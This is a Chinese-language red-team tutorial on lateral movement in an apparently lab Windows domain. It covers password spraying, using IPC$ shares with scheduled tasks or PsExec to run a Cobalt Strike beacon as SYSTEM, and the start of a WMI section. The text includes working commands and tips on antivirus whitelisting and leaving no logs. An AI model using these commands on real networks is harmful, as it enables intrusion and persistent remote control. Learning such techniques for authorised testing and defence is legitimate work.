**横向渗透**

根据拿到的用户名和密码进行密码喷洒，常用的工具比较多Crack系列工具或者cs插件都可以实现，或者根据密码枚举用户

![](../Images/da7029a3742188668275987c4890aff3.png)

![](../Images/888c9346d3205b662359b825800b4c0b.png)**1.ipc管道+计划任务**

> net use \\192.168.10.13\\c$ "1qaz@WSX" /user:user2

![](../Images/4c5c262549187e4d3019a63eb6d451a4.png)

> net use

![](../Images/5fb567b9d5fa40455527ea756d05763e.png)上线cs，利用ipc隧道上传cs马上线即可![](../Images/18797ef51308614f1da7b7e414bb6518.png)

> shell schtasks.exe /create /s 192.168.10.13 /sc once /st 20:03 /tn test2 /tr c:\\beacon.exe /ru system /f /u workgroup\\administrator /p "xxxx"

![](../Images/a7654f4fe8ce225c3e9563cab21f817d.png)上线，需要关闭win serverR1的防火墙

*   注意事项
    

这里需要目标机器的管理员用户权限才可以，或者域用户存在域管理员组，这里的巧合是因为搭建环境的时候`administrator`的口令和域用户`user1,user2`的口令相同，同样密码喷洒是可以爆破出来的。

**2\. ipc管道+psexec横向**无明文密码但是有hash的时候可以利用

![](../Images/866ba920d7ba85b419fd05b9dc0eb144.png)

*   使用条件
    

> 无明文密码内网或者域内存在主机使用想用的密码建立ipc隧道的用户为目标主机的管理用用户或者用户属于管理员用户组内

上传文件`PsExec.exe`，首先创建ipc$隧道，使用该应用进行横向

*   
*   
*   

```
net use  \\xxxxxxx\c$ "password" /u:administratorcopy beacon.exe \\xxxxxxx\c$psexec -accepteula \\xxxxxxx -h -d c:\beacon.exe
```

![](../Images/82740668aac84f9881734b6f4f56c200.png)

![](../Images/84f145ac7126d882651d9c0e897f4ed0.png)

目标主机上线

![](../Images/0994cc8f6a37c1164f2e21fe43234e83.png)

*   优点
    

psexec.exe在杀软白名单，一般不会拦截，且可以直接提权至system权限。

**4.wmi横向**

WMI是由一系列工具集成的，可以在本地或者远程管理计算机系统，主要通过135端口进行利用，支持明文或者Hash的方式进行认证，该手法并不会在操作系统中留下日志，推荐使用该方法进行内网的横向移动。

```
条件:开启135端口管理员账号和密码或者账号所属管理员用户组
```
